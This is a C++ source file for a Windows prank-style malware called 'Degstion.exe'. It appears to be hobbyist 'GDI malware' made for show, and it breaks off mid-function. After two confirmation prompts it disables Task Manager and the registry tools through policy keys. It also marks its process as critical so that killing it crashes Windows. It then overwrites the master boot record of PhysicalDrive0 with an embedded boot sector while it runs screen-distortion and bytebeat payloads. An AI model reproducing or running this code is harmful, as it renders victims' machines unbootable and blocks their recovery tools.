#pragma comment(lib, "msimg32.lib")
#include <windows.h>
#include <mmsystem.h>
#include <vector>
#include <cmath>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")

typedef LONG(WINAPI* RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef LONG(WINAPI* NtRaiseHardErrorFunc)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef VOID(NTAPI* RSPICdef)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}
volatile int activePhase = 0;

int red, green, blue;
COLORREF Hue(int length) {
    if (red != length) { red++; return RGB(red, 0, 0); }
    else if (green != length) { green++; return RGB(length, green, 0); }
    else if (blue != length) { blue++; return RGB(0, length, blue); }
    else { red = 0; green = 0; blue = 0; return RGB(0, 0, 0); }
}

void RefreshScreenClean() {
    InvalidateRect(NULL, NULL, TRUE);
    UpdateWindow(GetDesktopWindow());
}

void diskWiper(HINSTANCE hInstance) {
    unsigned char writeBuffer[512];
    memset((void*)writeBuffer, 0, 512);
    HRSRC hRes = FindResourceA(hInstance, MAKEINTRESOURCEA(101), "BINARY");
    if (hRes == NULL) return;
    HGLOBAL hData = LoadResource(hInstance, hRes);
    if (hData == NULL) return;
    unsigned char* bootBuffer = (unsigned char*)LockResource(hData);
    DWORD bootSize = SizeofResource(hInstance, hRes);
    if (bootBuffer != NULL && bootSize > 0) {
        DWORD bytesToCopy = (bootSize > 512) ? 512 : bootSize;
        memcpy((void*)writeBuffer, (const void*)bootBuffer, bytesToCopy);
    }
    else {
        return;
    }
    if (writeBuffer[510] == 0 && writeBuffer[511] == 0) {
        writeBuffer[510] = 0x55;
        writeBuffer[511] = 0xAA;
    }
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hDisk, (LPCVOID)writeBuffer, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }
}

void BlockSystemUtility(const char* subKey, const char* valueName, DWORD valueData) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_DWORD, (const BYTE*)&valueData, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}
DWORD WINAPI Sound1(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 11025 * 45;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>(t & 0xFFF) != 0 && (t & 0x3FF) != 0 ? ((((t >> 1 & 0x4000 ^ t) >> 14 & 3) + 1) * (((t >> 11) ^ (t >> 10)) % 5) * t % 99) + (((((((t >> 14 & 3) - (t >> 16 & 1)) + 3) / 3 | 0) * t % 99) & 0x40) | (2000 / (t & 0x3FF) | 0) | (40000 / (t & 0xFFF) | 0)) : 0;
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound2(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 22050 * 45;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>(t >> 4 | t * (t >> 5 & t >> 7) | t * (t >> 4 & t >> 5 | t >> 9) * t * (t + t >> t));
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound3(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 11025 * 30;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>((t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64));
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound4(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 11025 * 30;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>((t >> 10 | t * 5) & (t >> 8 | t * 4) & (t >> 4 | t * 6));
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound5(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 128);
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound6(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int bufSize = 22050 * 30;
    char* buffer = new char[bufSize];
    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>(t + (t & t >> 12) * t >> 8);
    }
    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000); waveOutReset(hWaveOut); waveOutClose(hWaveOut); delete[] buffer;
    return 0;
}
DWORD WINAPI Sound7(LPVOID lpParam) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufSize = 8000 * 30;
    char* buffer = new char[bufSize];

    for (DWORD t = 0; t < (DWORD)bufSize; ++t) {
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -(long)t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2));
    }

    WAVEHDR header = { buffer, (DWORD)bufSize, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    Sleep(30000);
    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    delete[] buffer;

    return 0;
}
DWORD WINAPI Cur(LPVOID lpParam) {
    int iconIndexes[] = { 3, 4, 15, 27, 47, 77, 93, 109, 131, 161, 238, 240 };
    int totalIcons = sizeof(iconIndexes) / sizeof(iconIndexes);

    HMODULE hShell = LoadLibraryW(L"shell32.dll");
    srand(GetTickCount());

    DWORD lastIconChange = GetTickCount();
    HICON hIcon = ExtractIconW(GetModuleHandle(NULL), L"shell32.dll", iconIndexes[0]);
    HCURSOR hCurrentCursor = LoadCursor(NULL, IDC_ARROW);

    while (true) {
        DWORD currentTick = GetTickCount();

        if (currentTick - lastIconChange >= 2000) {
            int randomIndex = rand() % totalIcons;
            HICON hNewIcon = ExtractIconW(GetModuleHandle(NULL), L"shell32.dll", iconIndexes[randomIndex]);
            if (hNewIcon) {
                if (hIcon) DestroyIcon(hIcon);
                hIcon = hNewIcon;

                ICONINFO ii;
                if (GetIconInfo(hIcon, &ii)) {
                    ii.fIcon = FALSE;
                    ii.xHotspot = 0;
                    ii.yHotspot = 0;
                    hCurrentCursor = CreateIconIndirect(&ii);
                    DeleteObject(ii.hbmMask);
                    DeleteObject(ii.hbmColor);
                }
            }
            lastIconChange = currentTick;
        }

        SetCursor(hCurrentCursor);

        POINT p;
        if (GetCursorPos(&p)) {
            int offsetX = (rand() % 31) - 15;
            int offsetY = (rand() % 31) - 15;
            int newX = p.x + offsetX;
            int newY = p.x + offsetY;

            SetCursorPos(newX, newY);

            if (hIcon) {
                HDC hdc = GetDC(NULL);
                if (hdc) {
                    DrawIcon(hdc, newX, newY, hIcon);
                    ReleaseDC(NULL, hdc);
                }
            }
        }

        Sleep(30);
    }

    if (hIcon) DestroyIcon(hIcon);
    if (hShell) FreeLibrary(hShell);
    return 0;
}
DWORD WINAPI Disabler(LPVOID lpParam) {
    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
    BlockSystemUtility("Software\\Policies\\Microsoft\\Windows\\MMC", "RestrictToPermittedSnapIns", 1);
    return 1;
}
DWORD WINAPI texts(LPVOID lpvd)
{
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;
    LPCSTR text5 = 0;
    LPCSTR text6 = 0;
    LPCSTR text7 = 0;
    LPCSTR text8 = 0;
    while (1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "Degstion.exe";
        text1 = "AMOGUS!!!";
        text2 = "pangey1";
        text3 = "Enjoy your new PC!!!";
        text4 = "THERE IS NO MERCY!!!";
        text5 = "IS THIS OHIO?!";
        text6 = "WHAT IS HAPPENING?!";
        text7 = "R.I.P PC!!!";
        text8 = "SYSTEM OVERLOADED!!!";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text8, strlen(text8));
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Payload1(LPVOID lpParam) {
    int iconIndexes[] = { 3, 4, 15, 27, 47, 77, 93, 109, 131, 161, 238, 240 };
    int totalIcons = sizeof(iconIndexes) / sizeof(iconIndexes);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    srand(GetTickCount());

    DWORD startTime = GetTickCount();

    while (activePhase == 1 && (GetTickCount() - startTime < 15000)) {
        HDC hdc = GetDC(NULL);
        if (hdc) {
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hbmMem = CreateCompatibleBitmap(hdc, w, h);
            HBITMAP hOldBm = (HBITMAP)SelectObject(hdcMem, hbmMem);

            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            bool invert = (rand() % 2 == 0);

            for (int y = 0; y < h; y += 4) {
                for (int x = 0; x < w; x += 4) {
                    int colorVal = (x ^ y) & 0xFF;
                    if (invert) {
                        colorVal = 255 - colorVal;
                    }
                    COLORREF xorBlue = RGB(0, 0, colorVal);

                    HBRUSH hBrush = CreateSolidBrush(xorBlue);
                    RECT r = { x, y, x + 4, y + 4 };
                    FillRect(hdcMem, &r, hBrush);
                    DeleteObject(hBrush);
                }
            }

            for (int i = 0; i < 5; i++) {
                int randomIndex = rand() % totalIcons;
                HICON hIcon = ExtractIconW(GetModuleHandle(NULL), L"shell32.dll", iconIndexes[randomIndex]);
                if (hIcon) {
                    DrawIcon(hdcMem, rand() % w, rand() % h, hIcon);
                    DestroyIcon(hIcon);
                }
            }

            BLENDFUNCTION bf = { AC_SRC_OVER, 0, 128, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcMem, 0, 0, w, h, bf);

            SelectObject(hdcMem, hOldBm);
            DeleteObject(hbmMem);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdc);
        }

        Sleep(50);
    }

    RefreshScreenClean();
    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx;
    while (activePhase == 2) {
        hdc = GetDC(0);
        rx = rand() % sw;
        int ry = rand() % sh;
        BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, SRCCOPY);
        BitBlt(hdc, rx, -10, -100, sh, hdc, rx, 0, SRCCOPY);
        BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, SRCCOPY);
        BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, SRCCOPY);
        BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }

    RefreshScreenClean();
    return 0;
}

DWORD WINAPI playload3(LPVOID lpParam) {
    int y = GetSystemMetrics(SM_CYSCREEN);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int yfull = GetSystemMetrics(SM_CYFULLSCREEN);
    int xfull = GetSystemMetrics(SM_CXFULLSCREEN);
    int rainbow = x - rand() % x - (x / 150 - 112) % 149;
    int inc = round(x / 100);
    round(y / 1);
    round(yfull / 100);
    round(xfull / 10);
    while (activePhase == 3) {
        HDC hdc = GetDC(0);
        for (int yp = 0; yp < y && activePhase == 3; ++yp) {
            for (int xp = 0; xp < x && activePhase == 3; ++xp) {
                int xa = inc ^ xp;
                SetPixel(hdc, xp, yp, RGB(xa, xa, xa));
                SetPixel(hdc, yp, rainbow, RGB(yfull, xa, xfull));
                SetPixel(hdc, rainbow, rainbow, RGB(rainbow, rainbow, rainbow));
                SetPixel(hdc, rainbow, yp, RGB(xfull, yfull, xfull));
            }
        }
        ReleaseDC(0, hdc);
    }

    RefreshScreenClean();
    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (activePhase == 4)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)((4 * i) + ((4 * i) * sin((x + i) / 16.0)) + (4 * i) + ((4 * i) * sin((y - i) / 8.0)));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
                hslcolor.l = fmod(hslcolor.l + 0.1f * cos(i / 10.0f), 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    RefreshScreenClean();
    return 0x00;
}

DWORD WINAPI Playload5(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (activePhase == 5)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((4 * i) + ((4 * i) * sin(x / 32.0)) + (4 * i) + ((4 * i) * sin(y / 24.0)));

                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);

                float currentHueDegrees = hslcolor.h * 360.f;

                if ((currentHueDegrees >= 0.f && currentHueDegrees <= 20.f) ||
                    (currentHueDegrees >= 340.f && currentHueDegrees <= 360.f) ||
                    (currentHueDegrees >= 40.f && currentHueDegrees <= 65.f))
                {
                    hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    RefreshScreenClean();
    return 0x00;
}

DWORD WINAPI payload6(LPVOID lpParam)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (activePhase == 6)
    {
        HDC hdc = GetDC(NULL);
        if (!hdc) continue;

        StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);

        HPEN hPen = CreatePen(PS_SOLID, rand() % 10 + 2, RGB(rand() % 256, rand() % 256, rand() % 256));
        HPEN oldPen = (HPEN)SelectObject(hdc, hPen);

        int startX = rand() % w;
        int startY = rand() % h;
        MoveToEx(hdc, startX, startY, NULL);

        // ИСПРАВЛЕНО: Объявляем массив из 3-х точек, как в исходном коде
        POINT points[3];
        points[0].x = rand() % w;
        points[0].y = rand() % h;
        points[1].x = rand() % w;
        points[1].y = rand() % h;
        points[2].x = rand() % w;
        points[2].y = rand() % h;

        PolyBezierTo(hdc, points, 3);

        SelectObject(hdc, oldPen);
        DeleteObject(hPen);
        ReleaseDC(NULL, hdc);

        Sleep(10);
    }

    RefreshScreenClean();
    return 0;
}

DWORD WINAPI Payload7(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    srand(GetTickCount());

    DWORD startTime = GetTickCount();

    while (activePhase == 7 && (GetTickCount() - startTime < 15000)) {
        HDC hdc = GetDC(NULL);
        if (hdc) {
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);

            PatBlt(hdc, 0, 0, w, h, PATINVERT);

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);

            int destX = w + ((rand() % 21) - 10);
            int destY = (rand() % 21) - 10;
            int destWidth = -w + ((rand() % 21) - 10);
            int destHeight = h + ((rand() % 21) - 10);

            int srcX = (rand() % 21) - 10;
            int srcY = (rand() % 21) - 10;
            int srcWidth = w + ((rand() % 21) - 10);
            int srcHeight = h + ((rand() % 21) - 10);

            StretchBlt(
                hdc,
                destX, destY, destWidth, destHeight,
                hdc,
                srcX, srcY, srcWidth, srcHeight,
                SRCCOPY
            );

            ReleaseDC(NULL, hdc);
        }

        Sleep(10);
    }

    RefreshScreenClean();
    return 0;
}
DWORD WINAPI Ball(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    float hueCounter = 0.0f;

    while (1) {
        HDC hdc = GetDC(0);
        if (hdc) {
            int top_x = 0 + x;
            int top_y = 0 + y;
            int bottom_x = 100 + x;
            int bottom_y = 100 + y;

            x += incrementor * signX;
            y += incrementor * signY;

            hueCounter += 0.01f;
            if (hueCounter >= 1.0f) hueCounter = 0.0f;

            HSL hsl = { hueCounter, 1.0f, 0.5f };
            RGBQUAD rgb = Colors::hsl2rgb(hsl);

            HBRUSH brush = CreateSolidBrush(RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue));
            HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);

            Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);

            if (y >= h - 100) signY = -1;
            if (x >= w - 100) signX = -1;
            if (y <= 0) signY = 1;
            if (x <= 0) signX = 1;

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"Run malware?", L"Degstion.exe", MB_YESNO | MB_ICONWARNING | MB_TOPMOST) != IDYES) return 0;
    if (MessageBoxW(NULL, L"Are you sure?", L"Warning", MB_YESNO | MB_ICONWARNING | MB_TOPMOST) != IDYES) return 0;
    Sleep(500);

    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
    BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
    BlockSystemUtility("Software\\Policies\\Microsoft\\Windows\\MMC", "RestrictToPermittedSnapIns", 1);

    HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
    if (hNtdllModule) {
        BOOLEAN bl;
        RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(hNtdllModule, "RtlAdjustPrivilege");
        RSPICdef fSetCritical = (RSPICdef)GetProcAddress(hNtdllModule, "RtlSetProcessIsCritical");
        if (RtlAdjustPrivilege != NULL && fSetCritical != NULL) { RtlAdjustPrivilege(20, TRUE, FALSE, &bl); fSetCritical(TRUE, NULL, FALSE); }
    }

    diskWiper(hInstance);

    HDC hdc = GetDC(NULL); int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC deskMem = CreateCompatibleDC(hdc); HBITMAP scr = CreateCompatibleBitmap(hdc, sw, sh); SelectObject(deskMem, scr);

    CreateThread(NULL, 0, Ball, NULL, 0, NULL);
    CreateThread(NULL, 0, Cur, NULL, 0, NULL);

    activePhase = 1;
    HANDLE hThread1 = CreateThread(NULL, 0, Payload1, NULL, 0, NULL);
    HANDLE hSnd1 = CreateThread(NULL, 0, Sound1, NULL, 0, NULL);
    if (hSnd1 != NULL) { WaitForSingleObject(hSnd1, INFINITE); CloseHandle(hSnd1); }
    activePhase = 0; if (hThread1 != NULL) { WaitForSingleObject(hThread1, INFINITE); CloseHandle(hThread1); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 2;
    HANDLE hThread2 = CreateThread(NULL, 0, payload2, NULL, 0, NULL);
    HANDLE hSnd2 = CreateThread(NULL, 0, Sound2, NULL, 0, NULL);
    if (hSnd2 != NULL) { WaitForSingleObject(hSnd2, INFINITE); CloseHandle(hSnd2); }
    activePhase = 0; if (hThread2 != NULL) { WaitForSingleObject(hThread2, INFINITE); CloseHandle(hThread2); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 3;
    CreateThread(NULL, 0, texts, NULL, 0, NULL);
    HANDLE hThread3 = CreateThread(NULL, 0, playload3, NULL, 0, NULL);
    HANDLE hSnd3 = CreateThread(NULL, 0, Sound3, NULL, 0, NULL);
    if (hSnd3 != NULL) { WaitForSingleObject(hSnd3, INFINITE); CloseHandle(hSnd3); }
